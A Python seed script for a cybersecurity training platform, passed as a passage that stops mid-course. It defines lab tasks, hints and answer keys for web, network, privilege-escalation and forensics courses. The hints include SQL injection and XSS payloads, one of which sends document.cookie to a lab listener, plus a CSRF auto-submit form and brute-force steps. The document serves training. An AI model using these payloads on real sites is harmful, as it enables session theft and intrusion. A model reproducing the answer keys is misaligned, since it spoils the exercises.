"""
seeds/seed_all.py — Master seed script for CyberArcade.

Creates all database tables (idempotent) and seeds:
  • Default admin user
  • Web Application Security course
  • Network Penetration Testing course
  • Linux Privilege Escalation course
  • Digital Forensics course (8 labs, 69 tasks)
  • Metasploit & Metasploitable Penetration Testing course (4 labs, 20 tasks)

Usage:
  python seeds/seed_all.py           # skip courses that already exist
  python seeds/seed_all.py --force   # delete and re-seed ALL courses

Run from the cyberarcade-backend directory.
"""

import asyncio
import sys
import os

# Allow running from anywhere inside the backend tree
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sqlalchemy import select
from app.core.database import engine, async_session, Base
import app.models  # registers ALL ORM classes so create_all sees every table
from app.models.user import User
from app.models.course import Course
from app.models.lab import Lab, LabTask, Hint
from app.core.security import hash_password

# ─────────────────────────────────────────────────────────────────────────────
# Default admin account (created if no admin exists yet)
# ─────────────────────────────────────────────────────────────────────────────
ADMIN_EMAIL = os.getenv("CYBERARCADE_ADMIN_EMAIL", "").strip()
ADMIN_PASSWORD = os.getenv("CYBERARCADE_ADMIN_PASSWORD", "")
ADMIN_NAME = "CyberArcade Admin"

# ─────────────────────────────────────────────────────────────────────────────
# Course catalogue
# Each course → list of labs → list of tasks → list of hints
# Hint format: {"text": "...", "order": 1, "delay": 0}
# ─────────────────────────────────────────────────────────────────────────────

ALL_COURSES = [

    # ═════════════════════════════════════════════════════════════════════════
    # 1. Web Application Security
    # ═════════════════════════════════════════════════════════════════════════
    {
        "title": "Web Application Security",
        "description": (
            "Master the most common web vulnerabilities including SQL injection, XSS, CSRF, "
            "and authentication bypass techniques. Learn to think like an attacker to build "
            "stronger defenses."
        ),
        "difficulty_level": "beginner",
        "category": "Web Security",
        "estimated_hours": 6.0,
        "is_published": True,
        "labs": [
            {
                "title": "SQL Injection Fundamentals",
                "description": "Learn how attackers manipulate SQL queries to bypass authentication and extract sensitive data from databases.",
                "difficulty": "beginner",
                "has_auto_solve": True,
                "max_duration_minutes": 45,
                "sort_order": 0,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "dual", "terminal_type": "dual"},
                "tasks": [
                    {
                        "title": "Authentication Bypass",
                        "instructions": "The target web application has a login form vulnerable to SQL injection. Your goal is to bypass the authentication by crafting a malicious input that always evaluates to TRUE.\n\nTarget: http://10.10.14.5/login\n\nSubmit the exact payload you used in the username field.",
                        "expected_answer": "' OR '1'='1",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "SQL queries often look like: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'. What if you could close the quote early?", "order": 1, "delay": 3},
                            {"text": "Try injecting a single quote followed by OR and a condition that is always true. Don't forget to match the closing quote.", "order": 2, "delay": 5},
                            {"text": "The payload is: ' OR '1'='1  — this makes the WHERE clause always true.", "order": 3, "delay": 8},
                        ],
                    },
                    {
                        "title": "Database Enumeration",
                        "instructions": "Now that you can inject SQL, extract the database version from the target.\n\nUse a UNION-based SQL injection to retrieve the version string.\n\nSubmit the SQL function name used to get the database version.",
                        "expected_answer": "version()",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "You can use UNION SELECT to append your own query results to the original query.", "order": 1, "delay": 3},
                            {"text": "In MySQL, the function to get the version is VERSION(). In PostgreSQL, it's version().", "order": 2, "delay": 5},
                        ],
                    },
                    {
                        "title": "Data Extraction",
                        "instructions": "Extract the admin password hash from the users table using UNION-based injection.\n\nSubmit the first 8 characters of the admin password hash.",
                        "expected_answer": "5f4dcc3b",
                        "autosolve_commands": [],
                        "sort_order": 2,
                        "hints": [
                            {"text": "First, enumerate the table names using information_schema.tables.", "order": 1, "delay": 4},
                            {"text": "Then query: UNION SELECT password FROM users WHERE username='admin'", "order": 2, "delay": 6},
                        ],
                    },
                ],
            },
            {
                "title": "Cross-Site Scripting (XSS)",
                "description": "Discover and exploit XSS vulnerabilities to steal session cookies, deface pages, and understand how client-side attacks work.",
                "difficulty": "beginner",
                "has_auto_solve": True,
                "max_duration_minutes": 40,
                "sort_order": 1,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "dual", "terminal_type": "dual"},
                "tasks": [
                    {
                        "title": "Reflected XSS",
                        "instructions": "The search feature on the target website reflects user input without sanitization.\n\nTarget: http://10.10.14.5/search\n\nCraft a payload that triggers a JavaScript alert box showing 'XSS'. Submit the exact payload.",
                        "expected_answer": "<script>alert('XSS')</script>",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "The search term is reflected in the HTML response. What if it contained HTML tags?", "order": 1, "delay": 3},
                            {"text": "Try injecting <script> tags with JavaScript code inside.", "order": 2, "delay": 5},
                        ],
                    },
                    {
                        "title": "Cookie Theft via XSS",
                        "instructions": "Use XSS to steal the admin's session cookie. Craft a payload that sends document.cookie to your listener at http://10.10.14.2:4444.\n\nWhat JavaScript object contains the cookies?",
                        "expected_answer": "document.cookie",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Use document.cookie to access cookies, and new Image().src or fetch() to exfiltrate them.", "order": 1, "delay": 3},
                            {"text": "Payload: <script>new Image().src='http://10.10.14.2:4444/?c='+document.cookie</script>", "order": 2, "delay": 6},
                        ],
                    },
                ],
            },
            {
                "title": "CSRF & Session Attacks",
                "description": "Learn how Cross-Site Request Forgery works and practice crafting malicious pages that perform actions on behalf of authenticated users.",
                "difficulty": "intermediate",
                "has_auto_solve": False,
                "max_duration_minutes": 50,
                "sort_order": 2,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "dual", "terminal_type": "dual"},
                "tasks": [
                    {
                        "title": "Craft a CSRF Attack",
                        "instructions": "The target app's password change at /change-password does not use CSRF tokens.\n\nCreate an HTML page that, when visited by an admin, changes their password to 'hacked123'.\n\nWhat HTTP method does the password change form use?",
                        "expected_answer": "POST",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "CSRF attacks work by submitting forms from an attacker-controlled page to the victim's authenticated session.", "order": 1, "delay": 4},
                            {"text": "Use an auto-submitting form: <form method='POST' action='...'><script>document.forms[0].submit()</script>", "order": 2, "delay": 7},
                        ],
                    },
                ],
            },
        ],
    },

    # ═════════════════════════════════════════════════════════════════════════
    # 2. Network Penetration Testing
    # ═════════════════════════════════════════════════════════════════════════
    {
        "title": "Network Penetration Testing",
        "description": (
            "Learn systematic network reconnaissance, service enumeration, and exploitation "
            "techniques used by professional penetration testers and red teamers."
        ),
        "difficulty_level": "intermediate",
        "category": "Network Security",
        "estimated_hours": 8.0,
        "is_published": True,
        "labs": [
            {
                "title": "Network Reconnaissance with Nmap",
                "description": "Master the industry-standard network scanner. Discover hosts, enumerate open ports, identify services, and detect operating systems.",
                "difficulty": "beginner",
                "has_auto_solve": True,
                "max_duration_minutes": 35,
                "sort_order": 0,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "single", "terminal_type": "single"},
                "tasks": [
                    {
                        "title": "Port Discovery",
                        "instructions": "Scan the target machine at 10.10.14.5 and identify all open TCP ports.\n\nUse nmap with the -sV flag for version detection.\n\nHow many open ports did you find?",
                        "expected_answer": "3",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Run: nmap -sV 10.10.14.5 and count the ports listed as 'open'.", "order": 1, "delay": 2},
                            {"text": "The open ports are: 22 (SSH), 80 (HTTP), and 443 (HTTPS).", "order": 2, "delay": 4},
                        ],
                    },
                    {
                        "title": "Service Identification",
                        "instructions": "Identify the exact version of the SSH service running on port 22.\n\nSubmit the SSH version string (e.g., OpenSSH X.Y).",
                        "expected_answer": "OpenSSH 8.9",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Run: nmap -sV -p22 10.10.14.5", "order": 1, "delay": 2},
                            {"text": "Look at the VERSION column in the nmap output for port 22.", "order": 2, "delay": 4},
                        ],
                    },
                    {
                        "title": "OS Detection",
                        "instructions": "Determine the operating system of the target machine using nmap's OS detection feature.\n\nWhat OS family is the target running? (Linux/Windows)",
                        "expected_answer": "Linux",
                        "autosolve_commands": [],
                        "sort_order": 2,
                        "hints": [
                            {"text": "The -O flag enables OS detection. You may need sudo/root privileges.", "order": 1, "delay": 3},
                        ],
                    },
                ],
            },
            {
                "title": "SSH Brute Force Attack",
                "description": "Learn password guessing techniques using Hydra. Understand the importance of strong passwords and how attackers exploit weak credentials.",
                "difficulty": "intermediate",
                "has_auto_solve": True,
                "max_duration_minutes": 30,
                "sort_order": 1,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "single", "terminal_type": "single"},
                "tasks": [
                    {
                        "title": "Dictionary Attack",
                        "instructions": "Use Hydra to brute-force the SSH login on 10.10.14.5. The username is 'admin'.\n\nWhat is the admin's password?",
                        "expected_answer": "password123",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Hydra will try each password. Watch for [22][ssh] host: 10.10.14.5 login: admin password: ???", "order": 1, "delay": 3},
                            {"text": "The password is one of the most common passwords in the rockyou.txt wordlist.", "order": 2, "delay": 5},
                        ],
                    },
                    {
                        "title": "Post-Exploitation",
                        "instructions": "Log in with SSH and find the flag file.\n\nSubmit the flag contents.",
                        "expected_answer": "CTF{ssh_brut3_f0rc3_succ3ss}",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Use the 'find' command to search for flag.txt across the filesystem.", "order": 1, "delay": 3},
                            {"text": "The flag is located at /home/admin/flag.txt", "order": 2, "delay": 5},
                        ],
                    },
                ],
            },
            {
                "title": "Wireshark Traffic Analysis",
                "description": "Analyze network packet captures to detect attacks, extract credentials, and reconstruct communication flows.",
                "difficulty": "intermediate",
                "has_auto_solve": False,
                "max_duration_minutes": 45,
                "sort_order": 2,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "single", "terminal_type": "single"},
                "tasks": [
                    {
                        "title": "Credential Sniffing",
                        "instructions": "Open the provided PCAP file in Wireshark and analyze the captured HTTP traffic.\n\nWhat Wireshark display filter shows only HTTP POST requests?",
                        "expected_answer": "http.request.method == POST",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Wireshark display filters use field names like http.request.method.", "order": 1, "delay": 3},
                            {"text": "The filter syntax uses == for equality comparison.", "order": 2, "delay": 5},
                        ],
                    },
                ],
            },
        ],
    },

    # ═════════════════════════════════════════════════════════════════════════
    # 3. Linux Privilege Escalation
    # ═════════════════════════════════════════════════════════════════════════
    {
        "title": "Linux Privilege Escalation",
        "description": (
            "Learn to escalate from a low-privilege shell to root access on Linux systems. "
            "Cover SUID binaries, cron jobs, kernel exploits, and misconfigured services."
        ),
        "difficulty_level": "advanced",
        "category": "Red Team",
        "estimated_hours": 10.0,
        "is_published": True,
        "labs": [
            {
                "title": "SUID Binary Exploitation",
                "description": "Discover and exploit SUID binaries that can be abused to escalate privileges to root.",
                "difficulty": "advanced",
                "has_auto_solve": True,
                "max_duration_minutes": 60,
                "sort_order": 0,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "single", "terminal_type": "single"},
                "tasks": [
                    {
                        "title": "Find SUID Binaries",
                        "instructions": "Find all SUID binaries on the system.\n\nWhat command-line flag in 'find' searches for SUID permissions?",
                        "expected_answer": "-perm -4000",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "SUID files have the setuid bit set, represented as 4000 in octal.", "order": 1, "delay": 3},
                            {"text": "Use find with -perm flag. The dash before 4000 means 'at least these permissions'.", "order": 2, "delay": 5},
                        ],
                    },
                    {
                        "title": "Exploit the Binary",
                        "instructions": "The /usr/bin/python3 binary has the SUID bit set.\n\nWhat Python function is used to change the effective user ID to root?",
                        "expected_answer": "os.setuid",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "When a SUID binary runs as root, you can use it to change your effective user ID.", "order": 1, "delay": 4},
                            {"text": "The os module in Python has setuid() and system() functions. setuid(0) = become root.", "order": 2, "delay": 6},
                        ],
                    },
                    {
                        "title": "Capture the Root Flag",
                        "instructions": "Now that you have root access, read the flag file at /root/flag.txt.\n\nSubmit the flag.",
                        "expected_answer": "CTF{su1d_pr1v3sc_r00t3d}",
                        "autosolve_commands": [],
                        "sort_order": 2,
                        "hints": [
                            {"text": "Root flags are typically stored in /root/.", "order": 1, "delay": 2},
                        ],
                    },
                ],
            },
            {
                "title": "Cron Job Hijacking",
                "description": "Exploit misconfigured cron jobs to achieve privilege escalation by modifying scripts that run as root.",
                "difficulty": "advanced",
                "has_auto_solve": True,
                "max_duration_minutes": 50,
                "sort_order": 1,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "single", "terminal_type": "single"},
                "tasks": [
                    {
                        "title": "Discover Cron Jobs",
                        "instructions": "Enumerate the system's scheduled cron jobs to find one running as root.\n\nWhat file contains system-wide cron job definitions?",
                        "expected_answer": "/etc/crontab",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "System-wide cron jobs are defined in /etc/crontab and files within /etc/cron.d/.", "order": 1, "delay": 3},
                        ],
                    },
                    {
                        "title": "Hijack the Script",
                        "instructions": "A cron job runs /opt/backup.sh as root every minute, and the file is world-writable.\n\nWhat bash flag makes it preserve the SUID effective UID?",
                        "expected_answer": "-p",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Bash drops privileges by default. The -p flag tells it to keep the effective UID.", "order": 1, "delay": 4},
                        ],
                    },
                ],
            },
        ],
    },

    # ═════════════════════════════════════════════════════════════════════════
    # 4. Digital Forensics  (8 labs, 69 tasks)
    # ═════════════════════════════════════════════════════════════════════════
    {
        "title": "Digital Forensics",
        "description": (
            "Master digital forensics from foundations to advanced investigation techniques. "
            "Covering evidence preservation, hidden data discovery, memory forensics, deleted file "
            "recovery, steganography, and malware persistence analysis — all using Kali Linux tools "
            "in an isolated Docker environment."
        ),
        "difficulty_level": "intermediate",
        "category": "Digital Forensics",
        "estimated_hours": 16.0,
        "is_published": True,
        "labs": [
            # ── Lab 0 — Foundations (theory, no terminal) ─────────────────────────
            {
                "title": "Digital Forensics Foundations",
                "description": "Introduction to digital forensics concepts, evidence preservation, and key terminology.",
                "difficulty": "beginner",
                "has_auto_solve": False,
                "max_duration_minutes": None,
                "sort_order": 0,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": None, "terminal_type": "none"},
                "tasks": [
                    {
                        "title": "Task 1 - Define Digital Forensics",
                        "instructions": "What is digital forensics?",
                        "expected_answer": "Digital forensics is the process of identifying, preserving, analyzing, and presenting digital evidence.",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Think about investigation, not only hacking.", "order": 1, "delay": 0},
                            {"text": "The evidence may come from computers, USB drives, phones, or memory.", "order": 2, "delay": 0},
                            {"text": "Use the words: identify, preserve, analyze, present.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 2 - Evidence Preservation",
                        "instructions": "Why should investigators avoid changing the original evidence?",
                        "expected_answer": "Changing original evidence can affect integrity, timestamps, metadata, and legal reliability.",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Evidence must remain trustworthy.", "order": 1, "delay": 0},
                            {"text": "Even opening a file may change metadata.", "order": 2, "delay": 0},
                            {"text": "Investigators usually analyze a copy or forensic image.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 3 - Volatile vs Non-Volatile Evidence",
                        "instructions": "Give one example of volatile evidence and one example of non-volatile evidence.",
                        "expected_answer": "Volatile: RAM, running processes, network connections. Non-volatile: hard disk, USB drive, SSD files.",
                        "autosolve_commands": [],
                        "sort_order": 2,
                        "hints": [
                            {"text": "Volatile evidence disappears after shutdown.", "order": 1, "delay": 0},
                            {"text": "Non-volatile evidence remains after power off.", "order": 2, "delay": 0},
                            {"text": "RAM is volatile; disk storage is non-volatile.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 4 - Forensic Image",
                        "instructions": "What is a forensic disk image?",
                        "expected_answer": "A forensic image is a bit-by-bit copy of a storage device used for analysis while preserving the original evidence.",
                        "autosolve_commands": [],
                        "sort_order": 3,
                        "hints": [
                            {"text": "It is more than copying visible files.", "order": 1, "delay": 0},
                            {"text": "It may include deleted data and file system structure.", "order": 2, "delay": 0},
                            {"text": "Investigators hash the image to verify integrity.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 5 - Trick Question: Mounting Evidence",
                        "instructions": "An investigator mounts the original USB normally and opens files to 'quickly check them.' Is this good practice? Explain why.",
                        "expected_answer": "No. Mounting normally may modify access times, metadata, or file system state. Evidence should be mounted read-only or imaged first.",
                        "autosolve_commands": [],
                        "sort_order": 4,
                        "hints": [
                            {"text": "Think about metadata changes.", "order": 1, "delay": 0},
                            {"text": "Opening files can change access timestamps.", "order": 2, "delay": 0},
                            {"text": "Use read-only access or analyze a forensic image.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 6 - Trick Question: Timestamps",
                        "instructions": "A file timestamp says it was modified in 2035. Should the investigator automatically trust this timestamp? Explain.",
                        "expected_answer": "No. Timestamps can be manipulated using anti-forensic techniques such as touch or system time changes.",
                        "autosolve_commands": [],
                        "sort_order": 5,
                        "hints": [
                            {"text": "Timestamps can be fake.", "order": 1, "delay": 0},
                            {"text": "Anti-forensics may manipulate file metadata.", "order": 2, "delay": 0},
                            {"text": "Compare timestamps with other evidence before trusting them.", "order": 3, "delay": 0},
                        ],
                    },
                ],
            },

            # ── Lab 1 — USB Acquisition and Evidence Search ────────────────────────
            {
                "title": "USB Acquisition and Evidence Search",
                "description": "Learn to search for files recursively, filter by size and date, and locate hidden evidence in a Kali Linux environment.",
                "difficulty": "beginner",
                "has_auto_solve": True,
                "max_duration_minutes": None,
                "sort_order": 1,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "df-kali", "terminal_type": "df-kali"},
                "tasks": [
                    {
                        "title": "Task 1 - Recursive Directory Listing",
                        "instructions": "What is the Linux command used to list files and directories recursively?",
                        "expected_answer": "ls -R",
                        "autosolve_commands": ["cd ~ && ls -R labs/evidence-search"],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Use a command that displays directory contents.", "order": 1, "delay": 0},
                            {"text": "Add an option that enables recursive listing.", "order": 2, "delay": 0},
                            {"text": "The recursive option uses a capital letter.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 2 - Recursive Text Search",
                        "instructions": "What is the Linux command used to search recursively for text inside files?",
                        "expected_answer": 'grep -Ri "text" .',
                        "autosolve_commands": ["cd ~/labs/evidence-search && grep -Ri 'password' ."],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Use a command designed for searching text patterns.", "order": 1, "delay": 0},
                            {"text": "Add an option for recursive searching through directories.", "order": 2, "delay": 0},
                            {"text": "Another option can make the search case-insensitive.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 3 - Find Files by Size",
                        "instructions": "What is the Linux command used to find files larger than a specific size?",
                        "expected_answer": "find . -type f -size +10M",
                        "autosolve_commands": ["cd ~ && find . -type f -size +10M"],
                        "sort_order": 2,
                        "hints": [
                            {"text": "Use a command that searches for files and directories.", "order": 1, "delay": 0},
                            {"text": "Restrict the search to regular files only.", "order": 2, "delay": 0},
                            {"text": "Use the -size option to filter results.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 4 - Display File Contents",
                        "instructions": "What is the Linux command used to display the contents of a file?",
                        "expected_answer": "cat filename",
                        "autosolve_commands": ["cd ~/labs/evidence-search && cat suspicious.txt"],
                        "sort_order": 3,
                        "hints": [
                            {"text": "Use a command that prints file contents to the terminal.", "order": 1, "delay": 0},
                            {"text": "The command is commonly used for viewing text files quickly.", "order": 2, "delay": 0},
                            {"text": "Add the filename after the command.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 5 - Evidence: Large Files",
                        "instructions": "From the home directory, run the size search. Which files larger than 10MB appear? (List all paths, one per line)",
                        "expected_answer": "./labs/evidence-search/large_file.bin\n./labs/diskimage/evidence.dd",
                        "autosolve_commands": ["cd ~ && find . -type f -size +10M"],
                        "sort_order": 4,
                        "hints": [
                            {"text": "Start from the home directory using cd ~.", "order": 1, "delay": 0},
                            {"text": "Search only regular files with find . -type f.", "order": 2, "delay": 0},
                            {"text": "Filter for files larger than 10MB with -size +10M.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 6 - Evidence: Recently Modified File",
                        "instructions": "In ~/labs/evidence-search, which file appears when you search for files modified within the last day?",
                        "expected_answer": "./recent_activity.log",
                        "autosolve_commands": ["cd ~/labs/evidence-search && find . -type f -mtime -1"],
                        "sort_order": 5,
                        "hints": [
                            {"text": "Move into the evidence-search folder first.", "order": 1, "delay": 0},
                            {"text": "Use find . -type f to search only regular files.", "order": 2, "delay": 0},
                            {"text": "Use the modification-time filter -mtime -1.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 7 - Find Password Evidence",
                        "instructions": "In ~/labs/evidence-search, what password value is found in suspicious.txt?",
                        "expected_answer": "password=admin123",
                        "autosolve_commands": ["grep -h 'password=' ~/labs/evidence-search/suspicious.txt"],
                        "sort_order": 6,
                        "hints": [
                            {"text": "Move into the evidence-search folder first.", "order": 1, "delay": 0},
                            {"text": "Search recursively and case-insensitively with grep -Ri.", "order": 2, "delay": 0},
                            {"text": "Search for the word password and read the matching line.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 8 - Find Suspicious Permissions",
                        "instructions": "In ~/labs/evidence-search, which file has 777 permissions?",
                        "expected_answer": "./suspicious.txt",
                        "autosolve_commands": ["cd ~/labs/evidence-search && find . -type f -perm 777"],
                        "sort_order": 7,
                        "hints": [
                            {"text": "Move into the evidence-search folder first.", "order": 1, "delay": 0},
                            {"text": "Use find . -type f to search only regular files.", "order": 2, "delay": 0},
                            {"text": "Use -perm 777 to filter by permissions.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 9 - Evidence: Text Files",
                        "instructions": "In ~/labs/evidence-search, which files appear when you search for .txt files case-insensitively? (List all paths, sorted)",
                        "expected_answer": "./documents/meeting_notes.TXT\n./reports/q1_report.txt\n./reports/q2_report.txt\n./suspicious.txt",
                        "autosolve_commands": ['cd ~/labs/evidence-search && find . -iname "*.txt" | sort'],
                        "sort_order": 8,
                        "hints": [
                            {"text": "Move into the evidence-search folder first.", "order": 1, "delay": 0},
                            {"text": "Use find . with the case-insensitive name option.", "order": 2, "delay": 0},
                            {"text": 'Search for the pattern "*.txt".', "order": 3, "delay": 0},
                        ],
                    },
                ],
            },

            # ── Lab 2 — Hidden Data and Anti-Forensics ─────────────────────────────
            {
                "title": "Hidden Data and Anti-Forensics",
                "description": "Identify hidden files, detect disguised file types using the file command, inspect metadata, and uncover manipulated timestamps.",
                "difficulty": "intermediate",
                "has_auto_solve": True,
                "max_duration_minutes": None,
                "sort_order": 2,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "df-kali", "terminal_type": "df-kali"},
                "tasks": [
                    {
                        "title": "Task 1 - Command: Show Only Hidden Files",
                        "instructions": "Which Linux command displays only hidden files in the current directory (files starting with a dot)?",
                        "expected_answer": "ls -d .*",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Hidden files in Linux start with a dot (.).", "order": 1, "delay": 0},
                            {"text": "Use the ls command.", "order": 2, "delay": 0},
                            {"text": "Use an option that matches patterns instead of listing everything.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 2 - Command: Identify Real File Types",
                        "instructions": "Which command checks the real type of every visible file?",
                        "expected_answer": "file *",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Do not trust file extensions.", "order": 1, "delay": 0},
                            {"text": "Use the file command with a wildcard.", "order": 2, "delay": 0},
                            {"text": "The answer is a command.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 3 - Command: List ZIP Contents",
                        "instructions": "Which command lists the contents of budget.docx without extracting it?",
                        "expected_answer": "unzip -l budget.docx",
                        "autosolve_commands": [],
                        "sort_order": 2,
                        "hints": [
                            {"text": "The file may actually be a ZIP archive.", "order": 1, "delay": 0},
                            {"text": "Use unzip with the listing option.", "order": 2, "delay": 0},
                            {"text": "The answer is a command.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 4 - Command: Inspect Metadata",
                        "instructions": "Which command displays timestamps and metadata for all visible files?",
                        "expected_answer": "stat *",
                        "autosolve_commands": [],
                        "sort_order": 3,
                        "hints": [
                            {"text": "Use the metadata inspection command.", "order": 1, "delay": 0},
                            {"text": "Use it with a wildcard.", "order": 2, "delay": 0},
                            {"text": "The answer is a command.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 5 - Evidence: Hidden File Identification",
                        "instructions": "Navigate to ~/labs/hidden-data. Which hidden file exists in this directory?",
                        "expected_answer": ".hidden_config.txt",
                        "autosolve_commands": ["find ~/labs/hidden-data -maxdepth 1 -name '.*' ! -name '.' ! -name '..' -printf '%f\\n'"],
                        "sort_order": 4,
                        "hints": [
                            {"text": "First, use the command that lists directory contents: ls", "order": 1, "delay": 0},
                            {"text": "Then modify it with a flag that allows matching patterns: ls -d", "order": 2, "delay": 0},
                            {"text": "Use a wildcard pattern to target hidden files (files starting with a dot): .*", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 6 - Evidence: Disguised File Type",
                        "instructions": "What is the real file type of budget.docx?",
                        "expected_answer": "Zip archive data",
                        "autosolve_commands": ["file ~/labs/hidden-data/budget.docx | cut -d: -f2- | xargs | cut -d, -f1"],
                        "sort_order": 5,
                        "hints": [
                            {"text": "Run: file *", "order": 1, "delay": 0},
                            {"text": "Do not answer with the extension.", "order": 2, "delay": 0},
                            {"text": "Look at the type shown for budget.docx.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 7 - Evidence: Archive Contents",
                        "instructions": "Which two files are inside budget.docx?",
                        "expected_answer": "salary_data.csv and confidential_deals.txt",
                        "autosolve_commands": ["cd ~/labs/hidden-data && unzip -l budget.docx"],
                        "sort_order": 6,
                        "hints": [
                            {"text": "Run: unzip -l budget.docx", "order": 1, "delay": 0},
                            {"text": "Read the file names in the archive listing.", "order": 2, "delay": 0},
                            {"text": "There are two files.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 8 - Evidence: Sensitive Password",
                        "instructions": "What archive password is found in Sensitive_Data.txt?",
                        "expected_answer": "forensics2024",
                        "autosolve_commands": ["grep 'Password for archive:' ~/labs/hidden-data/Sensitive_Data.txt | awk '{print $NF}'"],
                        "sort_order": 7,
                        "hints": [
                            {"text": "Use grep for password or cat the sensitive file.", "order": 1, "delay": 0},
                            {"text": "Read the line that says Password for archive.", "order": 2, "delay": 0},
                            {"text": "Answer with the password value.", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 9 - Evidence: Manipulated Timestamp",
                        "instructions": "Which file has a suspicious old timestamp from 2020?",
                        "expected_answer": "Sensitive_Data.txt",
                        "autosolve_commands": ["cd ~/labs/hidden-data && stat *"],
                        "sort_order": 8,
                        "hints": [
                            {"text": "Run: stat *", "order": 1, "delay": 0},
                            {"text": "Compare the visible file timestamps.", "order": 2, "delay": 0},
                            {"text": "Look for the file dated 2020.", "order": 3, "delay": 0},
                        ],
                    },
                ],
            },

            # ── Lab 3 — Linux Regex and Artifact Extraction ────────────────────────
            {
                "title": "Linux Regex and Artifact Extraction",
                "description": "Use grep with regular expressions to extract emails, IP addresses, URLs, phone numbers, and MAC addresses from evidence files.",
                "difficulty": "intermediate",
                "has_auto_solve": True,
                "max_duration_minutes": None,
                "sort_order": 3,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "df-kali", "terminal_type": "df-kali"},
                "tasks": [
                    {
                        "title": "Task 1 - Command: Extract Emails",
                        "instructions": "Which command extracts email addresses from evidence.txt?",
                        "expected_answer": "grep -Eo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}' evidence.txt",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Use grep -Eo for regex searching", "order": 1, "delay": 0},
                            {"text": "Match the email username part before @ using [A-Za-z0-9._%+-]+@", "order": 2, "delay": 0},
                            {"text": "Match full domain format using [A-Za-z0-9.-]+\\.[A-Za-z]{2,}", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 2 - Command: Extract IPv4 Addresses",
                        "instructions": "Which command extracts IPv4 addresses from evidence.txt?",
                        "expected_answer": "grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}' evidence.txt",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Use grep -Eo for regex extraction", "order": 1, "delay": 0},
                            {"text": "IPv4 consists of four numeric octets separated by dots", "order": 2, "delay": 0},
                            {"text": "Use ([0-9]{1,3}\\.){3}[0-9]{1,3} to match full IPv4 format", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 3 - Command: Extract URLs",
                        "instructions": "Which command extracts HTTP and HTTPS URLs from evidence.txt?",
                        "expected_answer": "grep -Eo 'https?://[^ ]+' evidence.txt",
                        "autosolve_commands": [],
                        "sort_order": 2,
                        "hints": [
                            {"text": "Use grep -Eo for pattern matching", "order": 1, "delay": 0},
                            {"text": "URLs start with http or https so use https?://", "order": 2, "delay": 0},
                            {"text": "Match everything until a space using [^ ]+", "order": 3, "delay": 0},
                        ],
                    },
                    {
                        "title": "Task 4 - Command: Extract Egyptian Phone Numbers",
